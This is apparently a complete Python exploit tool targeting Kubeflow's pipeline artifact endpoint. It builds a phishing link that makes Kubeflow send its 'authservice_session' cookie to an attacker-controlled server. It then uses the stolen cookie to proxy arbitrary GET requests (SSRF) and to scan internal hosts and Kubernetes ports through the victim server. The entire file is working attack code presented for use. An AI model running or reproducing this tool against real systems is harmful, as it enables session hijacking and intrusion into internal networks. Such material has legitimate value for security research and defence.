import requests
import argparse
import sys
import os
from libs.PoolScraper import PoolScraper


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--fetch-cookie',
                        help="Forces Kubeflow to send its authentication cookie to an attacker-controlled server",
                        action='store_true')
    parser.add_argument('--scan', help="Scan list of IP addresses for open HTTP/S ports", action='store_true')
    parser.add_argument('--send-get', help="Send custom GET request using Kubeflow as proxy", action='store_true')
    parser.add_argument('--attacker-url', type=str, help="Attacker controlled public server address", required=False)
    parser.add_argument('--kubeflow-url', type=str, help="Victim server address", required=False)
    parser.add_argument('--get-url', type=str, help="URL to send GET request via Kubeflow as a proxy", required=False)
    parser.add_argument('--path', type=str, help="Path and parameters for GET request using Kubeflow as proxy", required=False)
    parser.add_argument('--cookie', type=str, help="Cookie to send with GET request", required=False)
    parser.add_argument('--ip-list', type=str, help="List of IP addresses to scan", required=False)
    parsed_args = parser.parse_args()
    return parsed_args


class FetchCookie:
    """
    Forces Kubeflow to send its authentication cookie to an attacker-controlled server
    """
    def __init__(self, args: object):
        self.attacker_url = args.attacker_url
        self.kubeflow_url = args.kubeflow_url

    def check_args(self):
        if not args.attacker_url:
            print("[*] Please specify the attacker URL with --attacker-url <my_public_server_url>, e.g. attacker.com")
            sys.exit()
        elif not args.kubeflow_url:
            print("[*] Please specify the Kubeflow protocol and URL with --kubeflow-url <victim_url>,"
                  " e.g. http://kubeflow.corp.com")
            sys.exit()

    def generate_namespace_payload(self):
        url = f"{self.kubeflow_url}/pipeline/artifacts/get?source=s3&peek=256&bucket=mlpipeline&key=1&namespace="
        encoded_attacker_url = ''.join(['%{:02x}'.format(ord(c)) for c in self.attacker_url])
        payload = url + encoded_attacker_url
        print('[+] Generated payload to send to victim:')
        print()
        print(payload)
        print()
        print('[*] After victim clicks on the link, check your server logs and copy the "authservice_session" cookie'
              ' value from the Kubeflow request for further use')

class SendGet:
    """
    Sends a custom GET request using Kubeflow as a proxy
    """
    def __init__(self, args: object):
        self.path = args.path
        self.get_url = args.get_url
        self.cookie = args.cookie
        self.kubeflow_url = args.kubeflow_url

    def check_args(self):
        if not self.path:
            print("Please specify the path and parameters for the GET request with --path <path_and_parameters>")
            sys.exit()
        elif not self.get_url:
            print("Please specify the URL you wish Kubeflow to GET with --get-url <URL>, e.g. 192.168.1.1:8080")
            sys.exit()
        elif not self.cookie:
            print("Please specify the cookie to send with the GET request with --cookie <cookie>")
            sys.exit()
        elif not self.kubeflow_url:
            print("Please specify the Kubeflow protocol and URL with --kubeflow-url <kubeflow_url>, "
                  "e.g. http://kubeflow.corp.com")
            sys.exit()

    def create_url(self):
        url = f"{self.kubeflow_url}/pipeline/artifacts/get?source=http&peek=256&bucket={self.get_url}&key={self.path}"
        return url

    def send_get(self):
        url = self.create_url()
        cookie = {'authservice_session': self.cookie}
        print(f'[+] {url}')
        r = requests.get(url, cookies=cookie, timeout=15)
        print('[+] Response from Kubeflow-proxied GET request:')
        headers = r.headers
        content = r.content.decode('utf-8')

        headers_str = ''
        for header, value in headers.items():
            headers_str += f'{header}: {value}\n'

        # Format the content nicely
        content_str = ''
        for line in content.split('\n'):
            content_str += f'{line}\n'

        print()
        print(headers_str)
        print(content_str)


class Scanner:
    """
    Scans a list of IP addresses for open HTTP/S ports
    """
    def __init__(self, args: object):
        self.ip_list = args.ip_list
        self.ports = [80, 443, 8000, 8080, 8443, 8888, 9000, 10250, 6443, 10259, 10257]
        self.kubeflow_url = args.kubeflow_url
        self.cookie = args.cookie
        self.urls = None

    def check_args(self):
        if not self.ip_list:
            print("Please specify the path to the list of IP addresses to scan, one per line, with --ip-list "
                  "<path_to_file>, e.g. /home/user/ips.txt")
            sys.exit()
        if not self.kubeflow_url:
            print("Please specify the Kubeflow protocol and URL with --kubeflow-url <kubeflow_url>, "
                  "e.g. http://kubeflow.corp.com")
            sys.exit()

    def parse_ips(self):
        try:
            with open(self.ip_list, 'r') as f:
                ip_list = f.read().splitlines()
        except:
            print("Unable to open IP list file")
            sys.exit()

        return ip_list

    def create_urls(self, ip_list):
        urls = []
        for ip in ip_list:
            for port in self.ports:
                urls.append(f"{self.kubeflow_url}/pipeline/artifacts/get?source=http&peek=256&bucket={ip}:{port}&key=%20")
        return urls

    def scan(self):
        ip_list = self.parse_ips()
        urls = self.create_urls(ip_list)
        scraper = PoolScraper(workers=10, timeout=10)
        reqs = []
        for url in urls:
            cookie = {'authservice_session': self.cookie}
            req_data = {'method': 'GET', 'headers': None, 'data': None, 'url': url, 'cookies': cookie, 'timeout': 10,
                        'verify': False, 'allow_redirects': False}
            reqs.append(req_data)
        resps = scraper.scrape(reqs)
        return resps

    def create_directory(self):
        if not os.path.exists('scan-results'):
            os.makedirs('scan-results')
        return

    def handle_resps(self, resps):
        for resp in resps:

            if resp == None:
                print('[-] Error: No response from Kubeflow server')
                # Check if all resps are None
                if [resp is None for resp in resps]:
                    sys.exit()

            # Check if the cookie is invalid
            if resp.status_code == 302:
                if 'dex/auth?' in resp.headers["Location"]:
                    print(f'[-] Kubeflow cookie is invalid, login redirect found: {resp.headers["Location"]}')
                    sys.exit()
                else:
                    print(f'[*] Redirect found: {resp.headers["Location"]}')
                continue

            # All good
            if resp.status_code == 200:
                print(resp.url)
                target = resp.url.split('bucket=')[1].split('&key')[0]
                with open(f'scan-results/{target}.txt', 'w+') as f:
                    f.write(resp.content.decode('utf-8'))
                if 'html>' in resp.content.decode('utf-8'):
                    print(f'[!] HTML found from {target}')
                print(f'[*] Saved {target} response to scan-results/{target}.txt')
                print()


if __name__ == "__main__":
    args = args()
    if args.fetch_cookie:
        fc = FetchCookie(args)
        fc.check_args()
        fc.generate_namespace_payload()

    elif args.send_get:
        sg = SendGet(args)
        sg.check_args()
        sg.send_get()

    elif args.scan:
        scanner = Scanner(args)
        scanner.check_args()
        resps = scanner.scan()
        scanner.create_directory()
        scanner.handle_resps(resps)
